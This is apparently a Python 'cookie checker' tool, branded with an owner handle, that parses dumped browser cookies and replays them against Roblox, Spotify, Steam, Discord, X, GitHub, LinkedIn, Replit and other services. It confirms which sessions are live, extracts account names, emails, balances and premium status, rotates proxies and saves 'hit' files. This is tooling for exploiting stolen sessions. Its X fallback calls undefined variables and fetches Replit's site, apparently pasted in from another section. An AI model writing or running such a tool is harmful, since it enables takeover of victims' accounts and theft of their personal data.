
"""
Multi-Service Cookie Checkers
Roblox, Spotify, Steam, Epic Games, Discord, Twitch, YouTube, Twitter/X, Reddit, GitHub
Based on Simple_Checker_Working_APIs_Confirmed.txt
"""
import re
import json
import requests
from datetime import datetime
from typing import Dict, List, Tuple, Optional

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass


# ─── Roblox ──────────────────────────────────────────────────────────────────

def is_valid_roblox(d: dict) -> bool:
    return any(k in d for k in ['.ROBLOSECURITY', 'ROBLOSECURITY', 'roblosecurity'])

def count_valid_roblox(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_roblox(d):
            result.append((src, d))
    return len(result), result

def check_roblox_cookie(cookies_dict, proxies_list):
    try:
        token = cookies_dict.get('.ROBLOSECURITY') or cookies_dict.get('ROBLOSECURITY') or cookies_dict.get('roblosecurity', '')
        if not token:
            return None, 'invalid'

        headers = {'Cookie': f'.ROBLOSECURITY={token}', 'User-Agent': 'Mozilla/5.0'}
        r = requests.get('https://users.roblox.com/v1/users/authenticated', 
                        headers=headers, timeout=(5, 10), verify=False)

        if r.status_code == 200:
            data = r.json()
            uid = data.get('id')

            # REAL Roblox Premium check — premiumfeatures API
            is_premium = False
            try:
                pr = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership',
                                  headers=headers, timeout=(5, 10), verify=False)
                if pr.status_code == 200:
                    pj = pr.json()
                    is_premium = bool(pj if isinstance(pj, bool) else pj.get('isPremium', pj.get('premium', False)))
            except Exception:
                pass

            # Extra info: Robux balance + followers (best effort)
            robux = 'N/A'
            try:
                er = requests.get(f'https://economy.roblox.com/v1/users/{uid}/currency',
                                  headers=headers, timeout=(5, 10), verify=False)
                if er.status_code == 200:
                    robux = str(er.json().get('robux', 'N/A'))
            except Exception:
                pass

            return {
                'name': data.get('name', 'N/A'),
                'id': uid,
                'display_name': data.get('displayName', 'N/A'),
                'is_premium': is_premium,
                'plan': 'Premium' if is_premium else 'Free',
                'robux': robux
            }, 'valid'
        elif r.status_code == 401:
            return None, 'expired'
        return None, 'error'
    except:
        return None, 'error'


# ─── Spotify ─────────────────────────────────────────────────────────────────

def is_valid_spotify(d: dict) -> bool:
    return any(k in d for k in ['sp_dc', 'sp_key', 'sp_access_token', 'sp_t'])

def count_valid_spotify(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_spotify(d):
            result.append((src, d))
    return len(result), result

def check_spotify_cookie(cookies_dict, proxies_list):
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Cookie': '; '.join([f"{k}={v}" for k,v in cookies_dict.items()])}
        r = requests.get('https://www.spotify.com/api/account-settings/v1/profile',
                        headers=headers, timeout=(5, 10), verify=False)

        if r.status_code == 200:
            try:
                data = r.json()
                email = data.get('email') or data.get('country')
                if not email:
                    return None, 'expired'
                product = str(data.get('product', 'free')).lower()
                return {
                    'email': data.get('email', 'N/A'),
                    'country': data.get('country', 'N/A'),
                    'is_premium': product not in ('free', 'open', ''),
                    'plan': product.title() if product else 'Free',
                }, 'valid'
            except:
                return None, 'error'
        elif r.status_code in (400, 401, 403):
            return None, 'expired'
        return None, 'error'
    except:
        return None, 'error'


# ─── Steam ───────────────────────────────────────────────────────────────────

def is_valid_steam(d: dict) -> bool:
    return any(k in d for k in ['steamLoginSecure', 'steamCountry', 'sessionid'])

def count_valid_steam(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_steam(d):
            result.append((src, d))
    return len(result), result

def check_steam_cookie(cookies_dict, proxies_list):
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Cookie': '; '.join([f"{k}={v}" for k,v in cookies_dict.items()])}
        # steamLoginSecure format: steamid64%7C%7Ctoken
        raw = cookies_dict.get('steamLoginSecure', '')
        steam_id = raw.split('%7C%7C')[0] if '%7C%7C' in raw else 'N/A'

        r = requests.get('https://steamcommunity.com/my/profile',
                        headers=headers, timeout=(5, 10), verify=False, allow_redirects=False)

        if r.status_code in (301, 302, 303):
            return None, 'expired'   # redirected to login page = session dead
        if r.status_code == 200:
            if 'Sign in' in r.text and 'g_btn_signin' in r.text:
                return None, 'expired'
            return {'id': steam_id, 'is_premium': True, 'plan': 'Steam'}, 'valid'
        return None, 'error'
    except:
        return None, 'error'


# ─── Epic Games ──────────────────────────────────────────────────────────────

def is_valid_epic(d: dict) -> bool:
    return any(k in d for k in ['EPIC_BEARER_TOKEN', 'EPIC_SESSION_AP', 'epic_username'])

def count_valid_epic(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_epic(d):
            result.append((src, d))
    return len(result), result

def check_epic_cookie(cookies_dict, proxies_list):
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Cookie': '; '.join([f"{k}={v}" for k,v in cookies_dict.items()])}
        r = requests.get('https://www.epicgames.com/id/api/redirect',
                        headers=headers, timeout=(5, 10), verify=False, allow_redirects=True)

        if r.status_code == 200:
            try:
                data = r.json()
                if not (data.get('authorizationCode') or data.get('exchangeCode')):
                    return None, 'expired'   # code null = logged out
                return {'is_premium': True, 'plan': 'Epic Games'}, 'valid'
            except:
                return None, 'error'
        elif r.status_code in (401, 403):
            return None, 'expired'
        return None, 'error'
    except:
        return None, 'error'


# ─── Discord ─────────────────────────────────────────────────────────────────

def is_valid_discord(d: dict) -> bool:
    return any(k in d for k in ['token', 'authorization'])

def count_valid_discord(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_discord(d):
            result.append((src, d))
    return len(result), result

def check_discord_cookie(cookies_dict, proxies_list):
    try:
        token = cookies_dict.get('token') or cookies_dict.get('authorization', '')
        if not token:
            return None, 'invalid'

        headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0'}
        r = requests.get('https://discord.com/api/v9/users/@me',
                        headers=headers, timeout=(5, 10), verify=False)

        if r.status_code == 200:
            data = r.json()
            return {
                'name': data.get('username', 'N/A'),
                'id': data.get('id', 'N/A'),
                'email': data.get('email', 'N/A'),
                'is_premium': data.get('premium_type', 0) > 0,
                'plan': 'Nitro' if data.get('premium_type', 0) > 0 else 'Free'
            }, 'valid'
        elif r.status_code in (401, 403):
            return None, 'expired'
        return None, 'error'
    except:
        return None, 'error'


# ─── Twitch ──────────────────────────────────────────────────────────────────

def is_valid_twitch(d: dict) -> bool:
    return any(k in d for k in ['auth-token', 'persistent', 'login'])

def count_valid_twitch(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_twitch(d):
            result.append((src, d))
    return len(result), result

def check_twitch_cookie(cookies_dict, proxies_list):
    try:
        token = cookies_dict.get('auth-token') or cookies_dict.get('persistent', '')
        if not token:
            return None, 'invalid'

        headers = {'Authorization': f'OAuth {token}', 'Client-Id': 'kimne78kx3ncx6brgo4mv6wki5h1ko', 'User-Agent': 'Mozilla/5.0'}
        r = requests.get('https://id.twitch.tv/oauth2/validate',
                        headers=headers, timeout=(5, 10), verify=False)

        if r.status_code == 200:
            data = r.json()
            return {
                'name': data.get('login', 'N/A'),
                'id': data.get('user_id', 'N/A'),
                'is_premium': True
            }, 'valid'
        elif r.status_code in (401, 403):
            return None, 'expired'
        return None, 'error'
    except:
        return None, 'error'


# ─── YouTube/Google ──────────────────────────────────────────────────────────

def is_valid_youtube(d: dict) -> bool:
    return any(k in d for k in ['SAPISID', 'APISID', 'SSID', 'SID', 'HSID'])

def count_valid_youtube(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_youtube(d):
            result.append((src, d))
    return len(result), result

def check_youtube_cookie(cookies_dict, proxies_list):
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Cookie': '; '.join([f"{k}={v}" for k,v in cookies_dict.items()])}
        r = requests.get('https://accounts.google.com/ListAccounts',
                        headers=headers, timeout=(5, 10), verify=False)

        if r.status_code == 200:
            return {'is_premium': True, 'plan': 'Google/YouTube'}, 'valid'
        elif r.status_code in (401, 403):
            return None, 'expired'
        return None, 'error'
    except:
        return None, 'error'


# ─── Twitter/X ───────────────────────────────────────────────────────────────

def is_valid_twitter(d: dict) -> bool:
    return any(k in d for k in ['auth_token', 'ct0', 'twid'])

def count_valid_twitter(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_twitter(d):
            result.append((src, d))
    return len(result), result

TWITTER_BEARER = "AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA"


def check_twitter_cookie(cookies_dict, proxies_list):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Cookie': '; '.join([f"{k}={v}" for k,v in cookies_dict.items()]),
            'x-csrf-token': cookies_dict.get('ct0', ''),
            'Authorization': 'Bearer ' + TWITTER_BEARER.replace('%3D', '='),
            'x-twitter-auth-type': 'OAuth2Session',
            'x-twitter-active-user': 'yes',
        }
        r = requests.get('https://api.x.com/1.1/account/multi/list.json',
                        headers=headers, timeout=(5, 10), verify=False)

        if r.status_code in (401, 403):
            return None, 'expired'
        if r.status_code != 200:
            # Fallback: homepage __NEXT_DATA__ — abhi bhi kaam karta hai (verified)
            try:
                rh = session.get('https://replit.com/', headers={'User-Agent': ua},
                                 timeout=(6, 15), verify=False)
            except Exception:
                return None, 'error'
            if rh.status_code != 200:
                return None, 'error'
            if '"currentUser":null' in rh.text:
                return None, 'expired'   # logged out
            if '"currentUser":{' not in rh.text:
                return None, 'expired'
            r = rh  # homepage se profile/plan parse hoga

        username = 'N/A'
        try:
            sr = requests.get('https://x.com/i/api/1.1/account/settings.json',
                              headers=headers, timeout=(5, 10), verify=False)
            if sr.status_code == 200:
                username = sr.json().get('screen_name', 'N/A')
        except Exception:
            pass

        # Blue / premium — verify_credentials 'verified' flag (best effort)
        is_premium, plan = False, 'Free'
        try:
            vr = requests.get('https://api.x.com/1.1/account/verify_credentials.json?include_entities=false&skip_status=true',
                              headers=headers, timeout=(5, 10), verify=False)
            if vr.status_code == 200:
                vd = vr.json()
                username = vd.get('screen_name', username)
                if vd.get('verified') or vd.get('is_blue_verified') or vd.get('ext_is_blue_verified'):
                    is_premium, plan = True, 'Blue (Premium)'
        except Exception:
            pass

        return {'username': username, 'name': username, 'is_premium': is_premium, 'plan': plan}, 'valid'
    except:
        return None, 'error'


# ─── Reddit ──────────────────────────────────────────────────────────────────

def is_valid_reddit(d: dict) -> bool:
    return any(k in d for k in ['reddit_session', 'token_v2', 'session_tracker'])

def count_valid_reddit(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_reddit(d):
            result.append((src, d))
    return len(result), result

def check_reddit_cookie(cookies_dict, proxies_list):
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Cookie': '; '.join([f"{k}={v}" for k,v in cookies_dict.items()])}
        r = requests.get('https://www.reddit.com/user/me/about.json',
                        headers=headers, timeout=(5, 10), verify=False)

        if r.status_code == 200:
            d = r.json().get('data', {})
            is_gold = bool(d.get('is_gold') or d.get('is_premium'))
            return {
                'username': d.get('name', 'N/A'),
                'name': d.get('name', 'N/A'),
                'karma': d.get('total_karma', 'N/A'),
                'is_premium': is_gold,
                'plan': 'Premium' if is_gold else 'Free'
            }, 'valid'
        elif r.status_code in (401, 403):
            return None, 'expired'
        return None, 'error'
    except:
        return None, 'error'


# ─── GitHub ──────────────────────────────────────────────────────────────────

def is_valid_github(d: dict) -> bool:
    return any(k in d for k in ['user_session', '__Host-user_session_same_site', 'dotcom_user'])

def count_valid_github(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_github(d):
            result.append((src, d))
    return len(result), result

def check_github_cookie(cookies_dict, proxies_list):
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Cookie': '; '.join([f"{k}={v}" for k,v in cookies_dict.items()])}
        r = requests.get('https://github.com/settings/emails',
                        headers=headers, timeout=(5, 10), verify=False, allow_redirects=False)

        if r.status_code in (301, 302, 303):
            return None, 'expired'   # /login pe redirect = session dead
        if r.status_code == 200 and 'settings/emails' in r.url:
            return {'is_premium': True, 'plan': 'GitHub'}, 'valid'
        elif r.status_code in (401, 403):
            return None, 'expired'
        return None, 'error'
    except:
        return None, 'error'


# ─── LinkedIn ────────────────────────────────────────────────────────────────

def is_valid_linkedin(d: dict) -> bool:
    return any(k in d for k in ['li_at', 'JSESSIONID', 'bcookie'])

def count_valid_linkedin(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_linkedin(d):
            result.append((src, d))
    return len(result), result

def check_linkedin_cookie(cookies_dict, proxies_list):
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Cookie': '; '.join([f"{k}={v}" for k,v in cookies_dict.items()])}
        r = requests.get('https://www.linkedin.com/voyager/api/me',
                        headers=headers, timeout=(5, 10), verify=False, allow_redirects=False)

        if r.status_code in (301, 302, 303, 401, 403):
            return None, 'expired'
        if r.status_code == 200:
            try:
                data = r.json()
                mini = data.get('miniProfile', data)
                name = f"{mini.get('firstName','')} {mini.get('lastName','')}".strip() or 'N/A'
                return {'name': name, 'is_premium': True, 'plan': 'LinkedIn'}, 'valid'
            except:
                return {'name': 'N/A', 'is_premium': True, 'plan': 'LinkedIn'}, 'valid'
        return None, 'error'
    except:
        return None, 'error'


# ─── Helper ──────────────────────────────────────────────────────────────────

def _parse_cookies(text: str) -> Dict[str, str]:
    text = text.strip()
    if not text:
        return {}
    try:
        if text.startswith('[') or text.startswith('{'):
            data = json.loads(text)
            if isinstance(data, list):
                cookies = {}
                for item in data:
                    if isinstance(item, dict):
                        name = item.get("name", item.get("Name", ""))
                        value = item.get("value", item.get("Value", ""))
                        if name and value is not None:
                            cookies[str(name)] = str(value)
                return cookies
            elif isinstance(data, dict):
                return {str(k): str(v) for k, v in data.items()}
    except:
        pass
    cookies = {}
    for line in text.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
        elif '=' in line and not line.startswith('http'):
            kv = line.split('=', 1)
            if len(kv) == 2:
                cookies[kv[0].strip().strip('"')] = kv[1].strip().strip(';').strip('"')
    return cookies


# ─── Formatters ──────────────────────────────────────────────────────────────

def format_hit_roblox(result, cookies_dict, source):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    content = f"""════════════════════════════════════════════════════════
  WHITE Roblox Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

  Name       : {result.get('name', 'N/A')}
  ID         : {result.get('id', 'N/A')}
  Display    : {result.get('display_name', 'N/A')}
  Plan       : {result.get('plan', 'N/A')}
  Robux      : {result.get('robux', 'N/A')}
  Premium    : {'Yes' if result.get('is_premium') else 'No'}

════════════════════════════════════════════════════════
"""
    return content, f"[roblox_{result.get('name', 'unknown')}].txt"


def format_hit_discord(result, cookies_dict, source):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    content = f"""════════════════════════════════════════════════════════
  WHITE Discord Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

  Username   : {result.get('name', 'N/A')}
  ID         : {result.get('id', 'N/A')}
  Email      : {result.get('email', 'N/A')}
  Plan       : {result.get('plan', 'N/A')}
  Premium    : {'Yes' if result.get('is_premium') else 'No'}

════════════════════════════════════════════════════════
"""
    return content, f"[discord_{result.get('name', 'unknown')}].txt"


def format_hit_twitch(result, cookies_dict, source):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    content = f"""════════════════════════════════════════════════════════
  WHITE Twitch Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

  Name       : {result.get('name', 'N/A')}
  ID         : {result.get('id', 'N/A')}
  Premium    : {'Yes' if result.get('is_premium') else 'No'}

════════════════════════════════════════════════════════
"""
    return content, f"[twitch_{result.get('name', 'unknown')}].txt"


# ═══ REPLIT ═══
def is_valid_replit(cookies_dict):
    return 'connect.sid' in cookies_dict and len(cookies_dict['connect.sid']) > 10


def count_valid_replit(files):
    count = 0
    cookie_list = []
    for fname, content in files:
        ck = _parse_cookies(content)
        if is_valid_replit(ck):
            count += 1
            cookie_list.append((fname, ck))
    return count, cookie_list


def _decode_jwt_payload(token):
    import base64 as _b64
    try:
        part = str(token).split('.')[1]
        part += '=' * (-len(part) % 4)
        return json.loads(_b64.urlsafe_b64decode(part))
    except Exception:
        return {}


def check_replit_cookie(cookies_dict: dict, proxies_list=None):
    """Replit cookie check — session API + dashboard + REAL plan (Core/Free from JWT paid flag)."""
    import re as _re
    try:
        if not is_valid_replit(cookies_dict):
            return None, 'invalid'

        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
        session = requests.Session()
        for k, v in cookies_dict.items():
            session.cookies.set(k, v, domain=".replit.com", path="/")
            session.cookies.set(k, v, domain="replit.com", path="/")

        # proxy support (dead proxy skip — host IP fallback)
        import random as _rnd
        if proxies_list:
            for _try in range(2):
                raw = _rnd.choice(proxies_list)
                try:
                    parts = raw.split(":")
                    if len(parts) == 4:
                        url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                    elif len(parts) == 2:
                        url = f"http://{parts[0]}:{parts[1]}"
                    else:
                        url = raw if raw.startswith(("http", "socks")) else f"http://{raw}"
                    session.proxies.update({"http": url, "https": url})
                    break
                except Exception:
                    continue

        # Step 1: session auth API (401/403 = dead)
        ah = {'User-Agent': ua, 'Content-Type': 'application/json',
              'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://replit.com',
              'Referer': 'https://replit.com/~'}
        def _is_cf_challenge(resp):
            """Cloudflare bot-challenge detect — valid cookie ko galat expired na maano"""
            try:
                h = {k.lower(): v.lower() for k, v in resp.headers.items()}
                if 'cf-mitigated' in h or 'cf-ray' in h:
                    ct = h.get('content-type', '')
                    if 'text/html' in ct or 'challenge' in h.get('cf-mitigated', ''):
                        return True
                body = (resp.text or '')[:500].lower()
                if 'cloudflare' in body and ('challenge' in body or 'just a moment' in body):
                    return True
            except Exception:
                pass
            return False

        auth_data = {}
        try:
            ar = session.post('https://replit.com/ai/chort/auth', headers=ah, data="{}",
                              timeout=(6, 15), verify=False, allow_redirects=False)
        except Exception:
            return None, 'error'
        if ar.status_code == 403 and _is_cf_challenge(ar):
            return None, 'error'   # Cloudflare block — IP/proxy issue
        if ar.status_code in (401, 403):
            # Confirm via homepage — only mark expired when currentUser is null
            # (endpoint change ho to valid cookies galat expired na hon)
            try:
                rc = session.get('https://replit.com/', headers={'User-Agent': ua},
                                 timeout=(6, 15), verify=False)
                if rc.status_code == 200 and '"currentUser":{' in rc.text:
                    auth_data = {}  # valid session — aage homepage fallback se parse hoga
                else:
                    return None, 'expired'
            except Exception:
                return None, 'error'
        if ar.status_code == 429:
            return None, 'error'
        if ar.status_code == 200:
            try:
                auth_data = ar.json() or {}
            except Exception:
                auth_data = {}

        # Step 2: dashboard (redirect to login = dead)
        try:
            r = session.get('https://replit.com/~', headers={'User-Agent': ua},
                            timeout=(6, 15), verify=False, allow_redirects=False)
        except Exception:
            return None, 'error'
        if r.status_code == 403 and _is_cf_challenge(r):
            return None, 'error'   # Cloudflare block
        if r.status_code in (301, 302, 303, 307, 308):
            if 'login' in r.headers.get('Location', ''):
                # Confirm via homepage — kabhi kabhi /~ redirect valid session pe bhi hota hai
                try:
                    rc = session.get('https://replit.com/', headers={'User-Agent': ua},
                                     timeout=(6, 15), verify=False)
                    if rc.status_code == 200 and '"currentUser":{' in rc.text:
                        r = rc
                    else:
                        return None, 'expired'
                except Exception:
                    return None, 'error'
            else:
                return None, 'error'
        if r.status_code != 200:
            return None, 'error'

        # Profile: JWT cookies first, then auth API, then HTML
        sid_payload = _decode_jwt_payload(cookies_dict.get('connect.sid', ''))
        sig_payload = _decode_jwt_payload(cookies_dict.get('__Host-session-sig', ''))

        username = sid_payload.get('name') or ''
        email = sid_payload.get('email') or ''
        if isinstance(auth_data, dict):
            username = auth_data.get('username') or auth_data.get('name') or username
            email = auth_data.get('email') or email
        if not username:
            um = (_re.search(r'"currentUser":\{[^}]*?"username"\s*:\s*"([^"]+)"', r.text)
                  or _re.search(r'"username"\s*:\s*"([^"]+)"', r.text)
                  or _re.search(r"Hi ([^,<]+), what do you want", r.text))
            if um:
                username = um.group(1).strip()

        expiry = 'N/A'
        if sid_payload.get('exp'):
            from datetime import datetime as _dt
            expiry = _dt.utcfromtimestamp(sid_payload['exp']).strftime('%Y-%m-%d %H:%M UTC')

        # REAL plan detection: __Host-session-sig JWT "paid" flag, dashboard fallback
        plan, is_premium = 'Unknown', None
        if 'paid' in sig_payload:
            is_premium = bool(sig_payload.get('paid'))
            plan = 'Core (Paid)' if is_premium else 'Free'
        html_low = r.text.lower()
        if is_premium is None and ('upgrade to replit core' in html_low or 'unlock more credits' in html_low):
            plan, is_premium = 'Free', False
        elif is_premium is None and ('"plan":"core"' in html_low or ('replit core' in html_low and 'manage plan' in html_low)):
            plan, is_premium = 'Core (Paid)', True

        return {
            'username': username or 'N/A',
            'email': email or 'N/A',
            'plan': plan,
            'is_premium': bool(is_premium),
            'expiry': expiry,
        }, 'valid'
    except Exception:
        return None, 'error'
